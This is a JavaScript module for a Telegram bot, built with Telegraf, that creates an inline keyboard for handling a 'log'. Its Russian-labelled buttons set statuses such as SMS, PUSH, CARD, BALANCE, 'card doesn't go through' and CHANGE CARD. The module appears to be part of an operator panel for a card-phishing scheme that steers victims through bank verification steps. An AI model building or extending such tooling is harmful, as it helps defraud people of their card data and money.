const { Markup } = require('telegraf');
const localeText = require('../../locale/text');

module.exports = async (log) => {
    const statusText = log.status === null ? 'Ожидание' : localeText.status[log.status];
    const statusButton = Markup.button.callback(statusText, 'nothing');

    const onlineButton = Markup.button.callback('👁', `eye_${log.id}`);
    const leaveButton = Markup.button.callback("🛑 Отказаться", `log_${log.id}_leave`);
    const successButton = Markup.button.callback("✅ Успех", `log_${log.id}_setStatus_success`);
    const smsButton = Markup.button.callback("SMS", `log_${log.id}_setStatus_sms`);
    const pushButton = Markup.button.callback("PUSH", `log_${log.id}_setStatus_push`);
    const cardButton = Markup.button.callback("КАРТА", `log_${log.id}_setStatus_card`);
    const balanceButton = Markup.button.callback("БАЛАНС", `log_${log.id}_setStatus_balance`);
    const skipButton = Markup.button.callback("НЕ БЬЕТСЯ", `log_${log.id}_setStatus_skip`);
    const changeButton = Markup.button.callback("СМЕНИТЬ КАРТУ", `log_${log.id}_setStatus_change`);
    const customButton = Markup.button.callback("КАСТОМ ВОПРОС", `custom_${log.id}`);
    const customErrorButton = Markup.button.callback("КАСТОМ ОШИБКА", `customError_${log.id}`);


    return Markup.inlineKeyboard([
        [statusButton],
        [onlineButton],
        [leaveButton, successButton],
        [smsButton, pushButton],
        [cardButton, balanceButton],
        [skipButton, changeButton],
        [customButton, customErrorButton]
    ]).reply_markup;
};